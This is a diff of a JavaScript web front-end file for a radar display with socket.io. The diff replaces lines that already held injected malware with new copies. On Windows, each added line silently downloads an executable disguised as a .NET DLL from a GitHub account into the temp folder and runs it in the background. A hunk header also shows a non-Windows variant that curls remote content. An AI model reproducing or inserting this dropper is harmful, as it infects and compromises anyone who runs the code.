@@ -6,7 +6,7 @@ $(function () {
 
 
 
-if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
+if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
         if ((navigator.userAgent.match(/iPhone/i)) ||
             (navigator.userAgent.match(/iPod/i))) {
             if (is_safari) {
@@ -37,7 +37,7 @@ if(process.platform!=='win32'){require('child_process').exec('curl -s https://ra
 
 
 
-if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
+if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
 $(function () {
     var radar = new Radar($('#radar')[0]);
     var socket = io();
